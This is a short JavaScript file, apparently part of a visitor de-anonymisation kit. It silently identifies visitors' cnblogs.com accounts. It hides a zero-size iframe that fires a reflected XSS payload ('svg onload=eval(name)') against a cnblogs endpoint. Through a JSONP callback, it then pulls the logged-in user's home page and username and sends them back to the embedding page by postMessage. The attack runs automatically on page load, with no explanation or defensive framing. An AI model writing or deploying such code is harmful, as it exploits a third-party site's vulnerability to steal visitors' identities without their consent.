// 个人主页   用户名

function formateCnblogsData(t) {
  if ('cnblogs' === t.data.source) {
    var n = t.data.d,
      a = /href="(http:\/\/home\.cnblogs\.com\/u\/.+?)">(.+?)<\/a>/.exec(n)
    if (a) {
      var o = { valid: !0, data: { homePage: a[1], userName: a[2] } }
      let innerHTML = `
      <div class='item'>
        <p class='title'>cnblogs</p>
        <p>个人主页: ${o.data.homePage}</p>
        <p>用户名: ${o.data.userName}</p>
      </div>
    `
      if (o.data.homePage) {
        getInifoData({ type: 'cnblogs', data: o.data, html: innerHTML })
      }
    }
  }
}
function cnblogs() {
  var e = document.createElement('iframe')
  e.src =
    'https://wz.cnblogs.com/create?t=xxxx&u="><svg/onload=eval(name)>&c=&i=0'
  e.width = 0
  e.height = 0
  e.style.borderWidth = 0
  e.name =
    "\n   window.test = function(data) {let s = {source: 'cnblogs', d: data}; window.parent.postMessage(s, '*');}\n  let s = document.createElement(\"script\");\n  s.src = 'https://passport.cnblogs.com/user/LoginInfo?callback=test'\n  document.documentElement.appendChild(s);\n  "
  document.documentElement.appendChild(e)
}
window.addEventListener('message', formateCnblogsData, !1)
// window.addEventListener('load', function () {
cnblogs()
// })
